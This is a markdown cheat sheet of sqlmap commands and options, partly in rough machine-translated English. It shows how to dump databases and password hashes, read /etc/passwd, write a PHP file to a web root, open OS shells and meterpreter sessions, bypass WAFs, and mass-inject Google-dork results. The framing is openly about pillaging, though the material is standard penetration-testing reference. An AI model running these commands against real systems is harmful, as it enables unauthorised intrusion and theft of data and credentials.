# SQLMap
Target the http://target.server.com URL using the “-u” flag:  
`sqlmap -u 'http://target.server.com'`  

Specify POST requests by specifying the “–data” flag:  
`sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'`  

Target a vulnerable parameter in an authenticated session by specifying cookies using the “–cookie” flag:  
`sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'`  

Drop all Set-Cookie requests from the target web server using the “–drop-set-cookie” flag:  
`sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie`  

Perform in-depth and risky attacks using the “–level” and “–risk” flags:  
`sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3`  

Specify which POST or GET parameter to target using the “-p” flag:  
`sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1`  

Choose a random User-Agent request header using the “–random-agent” flag:  
`sqlmap -u 'http://target.server.com' -r req.txt --random-agent`  

Target a certain database service using the “–dbms” flag:  
`sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle`  

Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:  
`sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords`  

Attempt privilege escalation on the target database  
`sqlmap -r ./req.txt --level=1 --risk=3 --privesc`  

Run the “whoami” command on the target server.  
`sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami`  

Dump everything in the database, but wait one second in-between requests.  
`sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1`  

Here are some useful options for your pillaging pleasure:  
`-r req.txt` Specify a request stored in a text file, great for saved requests from BurpSuite.  
`–force-ssl` Force SQLmap to use SSL or TLS for its requests. 
`–level=1` only test against the specified parameter, ignore all others.  
`–risk=3` Run all exploit attempts, even the dangerous ones (could damage database).  
`–delay` Set a delay in-between requests, great for throttled connections.  
`–proxy` Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.  
`–privesc` Attempt to elevate the privileges of the database service account.  
`–all` Enumerate everything inside the target database.  
`–hostname` Print the target database’s hostname.  
`–passwords` Find and exfiltrate all users and their password hashes or digests.  
`–dbs` Enumerate all databases accessible via the target webserver.  
`–comments` Enumerate all found comments inside the database.  
`–sql-shell` Return a SQL prompt for interaction.  
`–os-cmd` Attempt to execute a system command.  
`–os-shell` Attempt to return a command prompt or terminal for interaction. 
`–reg-read` Read the specified Windows registry key value.  
`–file-write` Specify a local file to be written to the target server.  
`–file-dest` Specify the remote destination to write a file to.  
`–technique` Specify a letter or letters of BEUSTQ to control the exploit attempts:  
B: Boolean-based blind  
E: Error-based  
U: Union query-based  
S: Stacked queries  
T: Time-based blind  
Q: Inline queries  


## Basic usage


`./sqlmap.py -u "inject address" --dbs` // enumerate database  
`./sqlmap.py -u "inject address" --current-db` // current database  
`./sqlmap.py -u "inject address" --users` // column database user  
`./sqlmap.py -u "inject address" --current-user` // current user  
`./sqlmap.py -u "inject address" --tables -D "database"` // enumerate the table name of the database  
`./sqlmap.py -u "inject address" --columns -T "table name" -D "database"` // get the column name of the table  
`./sqlmap.py -u "inject address" --dump -C "field, field" -T "table name" -D "database"` // get the data in the table, including the column, is the pants  

##  Submit using the POST method
`sqlmap -u "http://192.168.1.1/sqlmap/oracle/post_int.php" --method POST --data "id=1"`  
`sqlmap -u "https://xxxxx//search.aspx" --forms --batch --crawl=10  --dbms=MSSQL --dbs --current-db  --technique=BEUST --risk=3 --level=3`  

## Read the database version, current user, current database 
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1`  

## Determine the current database user permissions
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --privileges -U username-v 1 `  
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --is-dba -U username-v 1`  

## Read the passwords of all database users or specified database users 
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 `  
`Sqlmap.py-u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2`  

## Get all the databases
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2`  

## Get all the tables in the specified database
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2`  

## Get the field of the specified table in the specified database name 
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2`  

## Get the data of the specified field in the specified table in the specified database name 
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2`  

## file-read read web file
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2`  

## file-write writes files to the web 
`Sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file-dest /var/www/html/xx.php -v 2`   

## union Query table record
`Sqlmap.py -u "http://url/news?id=1" --union-cols `  

## injection

## Get the current user name 
`Sqlmap.py -u "http://url/news?id=1" --current-user`  
## Get the current database name
`Sqlmap.py -u "http://www.xxoo.com/news?id=1" --current-db `  
## listname
`Sqlmap.py -u "http://www.xxoo.com/news?id=1" --tables -D "db_name" `  
## column field
`Sqlmap.py -u "http://url/news?id=1" --columns -T "tablename" users-D "db_name" -v 0 `  
## Get the field contents
`Sqlmap.py -u "http://url/news?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0`  
## smart smart level Execution test level
`Sqlmap.py -u "http://url/news?id=1" --smart --level 3 --users`  
## dbms Specify database type
`Sqlmap.py -u "http://url/news?id=1" --dbms "Mysql" --users`  
## column database user
`Sqlmap.py -u "http://url/news?id=1" --users`  


## Access to information

`Sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users`		# dbms Specify database type  
`Sqlmap -u "http://url/news?id=1" --users` 					#column database user  
`Sqlmap -u "http://url/news?id=1" --dbs`						#column database  
`Sqlmap -u "http://url/news?id=1" --passwords`				#database user password  
`Sqlmap -u "http://url/news?id=1" --passwords -U root -v 0`   #list the password of the specified user database  
`Sqlmap -u "http://url/news?id=1" --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20`  #list designation Field, list 20  
`Sqlmap -u "http://url/news?id=1" --dump-all -v 0` 			#List all tables in all databases  
`Sqlmap -u "http://url/news?id=1" --privileges` 				#View Permissions  
`Sqlmap -u "http://url/news?id=1" --privileges -U root`		#View specified user permissions  
`Sqlmap -u "http://url/news?id=1" --is-dba -v 1` 				#is it a database administrator?  
`Sqlmap -u "http://url/news?id=1" --roles` 					#enumrate database user roles  
`Sqlmap -u "http://url/news?id=1" --udf-inject` 				#Import user-defined functions (get system privileges!)  
`Sqlmap -u "http://url/news?id=1" --dump-all --exclude-sysdbs -v 0` #list out all tables in the current library  
`Sqlmap -u "http://url/news?id=1" --union-cols` 				#union Query table record  
`Sqlmap -u "http://url/news?id=1" --cookie "COOKIE_VALUE"` 	#cookie injection  
`Sqlmap -u "http://url/news?id=1" -b` 						#Get banner information  
`Sqlmap -u "http://url/news?id=1" --data "id=3"` 				#postinjection  
`Sqlmap -u "http://url/news?id=1" -v 1 -f` 					#fingerprint database type  
`Sqlmap -u "http://url/news?id=1" --proxy "http://127.0.0.1:8118"` # Agent injection  
`Sqlmap -u "http://url/news?id=1" --string "STRING_ON_TRUE_PAGE"` #Specify keywords  
`Sqlmap -u "http://url/news?id=1" --sql-shell` 				#Execute the specified sql command  
`Sqlmap -u "http://url/news?id=1" --file /etc/passwd`
`Sqlmap -u "http://url/news?id=1" --os-cmd=whoami` 			#Execute system commands  
`Sqlmap -u "http://url/news?id=1" --os-shell`					#system interactive shell  
`Sqlmap -u "http://url/news?id=1" --os-pwn` 					#bounce shell  
`Sqlmap -u "http://url/news?id=1" --reg-read`				# read win system registry  
`Sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log"` 		# Save the progress  
`Sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log" --resume` # Restore saved progress  

-v parameter, level of detail, observe how sqlmap is trying to judge a point and read data.

### There are seven levels, the default is 1:

0, only show python errors and serious information. 
 
1. Display basic information and warning information at the same time. (default)  
 
2. Display debug information at the same time.  
 
3. Display the injected payload at the same time.  
 
4. Display HTTP requests at the same time.  
 
5. Display the HTTP response header at the same time.  
 
6. Display the HTTP response page at the same time.  


## Use sqlmap to remove pants
The –dump parameter is used to remove the pants. Add the whole -all(–dump-all) if you drag the whole  

Specify the field specified in the specified table:  

`sqlmap -u "http://xxx/index.php?id=1" --dump -D DBName -T TableName -C "id,username,password"  `  

Take off the entire pants:  

`sqlmap -u "http://xxx/index.php?id=1" -D DBName --dump-all`  


## Advanced usage

`-p` name Multiple parameters such as index.php?n_id=1&name=2&data=2020 We want to specify the name parameter to inject  

`Sqlmap -g "google syntax" --dump-all --batch` #google search injection point automatically runs out all fields, you need to ensure that google.com can access normally  

`--technique` test specifies the type of injection\technology used  
Test all injection techniques by default without parameters  
• B: Boolean based SQL blind  
• E: based on error sql injection  
• U: based on UNION injection  
• S: stacked sql injection  
• T: Time-based blind  

`--tamper` bypasses the WEB firewall (WAF) Sqlmap by encoding by default with char()  

--tamper plugin directory \sqlmap-dev\tamper  

`Sqlmap -u "http:// www.2cto.com /news?id=1" --smart --level 3 --users` #smart Intelligent level execution test level  

Attack example:
`Sqlmap -u "http://url/news?id=1&Submit=Submit" --cookie="xxx" --string="Surname" --dbms=mysql --user --password`

## Request
These options can be used to specify how to connect to the target URL :

`--data=DATA`           Data string sent via POST  
`--cookie=COOKIE`				HTTP Cookie header  
`--cookie-urlencode`		URL encoding generated by cookie injection  
`--drop-set-cookie`			Ignore the Set-Cookie header of the response  
`--user-agent=AGENT`		Specifies the HTTP User --Agent header  
`--random-agent`				uses a randomly selected HTTP User --Agent header  
`--referer=REFERER`		  Specifies the HTTP Referer header  
`--headers=HEADERS`			Wrap separate, add other HTTP headers  
`--auth-type=ATYPE`			HTTP authentication type (basic, digest or NTLM) (Basic, Digest or NTLM)  
`--auth-cred=ACRED`			HTTP authentication credentials (username: password)  
`--auth-cert=ACERT`			HTTP certificate (key_file, cert_file)  
`--proxy=PROXY`				  Connect to the target URL using an HTTP proxy  
`--proxy-cred=PCRED`		HTTP Proxy Authentication Credentials (Username: Password)  
`--ignore-proxy`				ignores the system default HTTP proxy  
`--delay=DELAY`				  The delay between each HTTP request in seconds  
`--timeout=TIMEOUT`			Time to wait for the connection to time out (default is 30 seconds)  
`--retries=RETRIES`			Time to reconnect after connection timeout (default 3)  
`--scope=SCOPE`				  Regular expression for the filter target from the provided proxy log  
`--safe-url=SAFURL`			The url address that is frequently accessed during the test.  
`--safe-freq=SAFREQ`		Test request between visits, giving a secure URL  

## Enumeration

These options can be used to enumerate information about the back-end database management system, the structure and data in the tables. In addition, you can also run your own SQL statements.

`-b, --banner`				  Retrieve the identity of the database management system  
`--current-user`				retrieves the current user of the database management system  
`--current-db`				  retrieves the current database of the database management system  
`--is-dba`					    Detects whether the DBMS current user is DBA  
`--users` 					    enumerates database management system users  
`--passwords` 				  enumerates database management system user password hashes  
`--privileges` 				  enumerates permissions for database management system users  
`--roles`						    enumerates the roles of database management system users  
`--dbs`						      enumerates the database management system database  
`--tables`					    enumerates tables in the DBMS database  
`--columns`					    enumerates DBMS database table columns  
`--dump`						    dumps the entries in the database of the database management system  
`--dump-all`					  dumps entries in all DBMS database tables  
`--search` 					    search column(s), table(s) and/or database name(s)  
`-D DB` 						    The name of the database to be enumerated  
`-T TBL` 						    Database table to be enumerated  
`-C COL` 						    Database column to be enumerated  
`-U USER`						    database user used for enumeration  
`--exclude-sysdbs`			Exclude system database when enumerating tables  
`--start=LIMITSTART`		The first query output goes into the search  
`--stop=LIMITSTOP` 			The output of the last query goes into the search  
`--first=FIRSTCHAR`			Character search for the first query output word  
`--last=LASTCHAR`				Output word character retrieval for the last query  
`--sql-query=QUERY`			SQL statement to execute  
`--sql-shell`					  prompts interactive SQL shell  

## Optimization

These options can be used to optimize the performance of SqlMap.

`-o` 							      turn on all optimization switches 
`--predict-output`			predicts common query output  
`--keep-alive`				  uses a persistent HTTP(S) connection  
`--null-connection` 		retrieves page length from no actual HTTP response body  
`--threads=THREADS`			Maximum HTTP(S) request concurrency (default is 1)  
`-p TESTPARAMETER` 			testable parameters (S)  
`--dbms=DBMS`					  forces the backend DBMS to this value  
`--os=OS`						    forces the backend DBMS operating system to this value  
`--prefix=PREFIX`				injection payload string prefix  
`--suffix=SUFFIX`				injection payload string suffix  
`--tamper=TAMPER`				Tampering with injected data using the given script(s)  

## Detection

These options can be used to specify how to parse and compare the contents of an HTTP response page when the SQL blinds.

`--level=LEVEL`				  The level at which the test is performed (1-5, default is 1)  
`--risk=RISK`					  Risk of performing tests (0-3, default is 1)  
`--string=STRING`				Matches the string when the query is valid  
`--regexp=REGEXP`				Query regular expression on page when valid  
`--text-only`					  based only on text content comparison pages  

## Techniques

These options can be used to tune specific SQL injection tests.

`--technique=TECH`			   SQL injection technology test (default BEUST)  
`--time-sec=TIMESEC`			 DBMS response delay time (default is 5 seconds)  
`--union-cols=UCOLS`			 Queued range for testing UNION query injection  
`--union-char=UCHAR`			 Character used to violently guess the number of columns  

## Fingerprint (fingerprint)

`-f, –fingerprint` 			Execute checks for extensive DBMS version fingerprints  


## Brute force

These options can be used to run brute force checks.

`--common-tables`				 check for the existence of a common table  
`--common-columns`			 check for common columns


## User-defined function injection

These options can be used to create user-defined functions.

`--udf-inject`				 injection user-defined function  
`--shared-lib=SHLIB` 			 local path to the shared library

## File system access
These options can be used to access the underlying file system of the backend database management system.

`--file-read=RFILE` 			Reads files from the backend database management system file system  
`--file-write=WFILE`			Edit the local file on the backend database management system file system  
`--file-dest=DFILE` 			The absolute path of the file management system write file to the backend  

## Operating system access

These options can be used to access the underlying operating system of the back-end database management system.

`--os-shell`					 interactive operating system shell  
`--os-pwn`					   Get an OOB shell, meterpreter or VNC  
`--os-smbrelay`				 Get an OOB shell, meterpreter or VNC with one click  
`--os-bof`					   stored procedure buffer overflow exploit  
`--priv-esc`					 database process user privilege  
`--msf-path=MSFPATH`	 Metasploit Framework local installation path  
`--tmp-path=TMPPATH`	 Absolute path to the remote temporary file directory  


## Windows registry access

These options can be used to access the backend database management system Windows registry.

`--reg-read`					   read a Windows registry key value  
`--reg-add`					     writes a Windows registry key value data  
`--reg-del`					     removes the Windows registry key  
`--reg-key=REGKEY`			 Windows registry key  
`--reg-value=REGVAL`		 Windows registry key value  
`--reg-data=REGDATA`		 Windows registry key value data  
`--reg-type=REGTYPE`		 Windows registry key value type  

## General
These options can be used to set some general working parameters.

`-t` 					      TRAFFICFILE logs all HTTP traffic to a text file  
`-s` 					      SESSIONFILE Saves and restores all data retrieved from the session file  
`--flush-session` 	refresh the current target session file  
`--fresh-queries`		ignores query results stored in session files  
`--eta`				      shows the estimated arrival time of each output  
`--update`			    Update SqlMap  
`--save`				    file Save options to the INI configuration file  
`--batch`				    never asks for user input, using all default configurations.  

## Miscellaneous (miscellaneous)

`--beep`		 		     find reminders when SQL injection  
`--check-payload`		 IDS detection test for injected payloads  
`--cleanup`			     SqlMap concrete UDF and table cleanup DBMS  
`--forms`				     parsing and testing form of target URL  
`--gpage=GOOGLEPAGE` Use Google Dork results from the specified page number  
`--page-rank`			   Google dork results show page rank (PR)  
`--parse-errors`		 parse database management system error messages from the response page  
`--replicate`			   copy dumped data to a sqlite3 database  
`--tor`				       uses the default Tor (Vidalia / Privoxy / Polipo) proxy address  
`--wizard`			     Simple wizard interface for beginners  
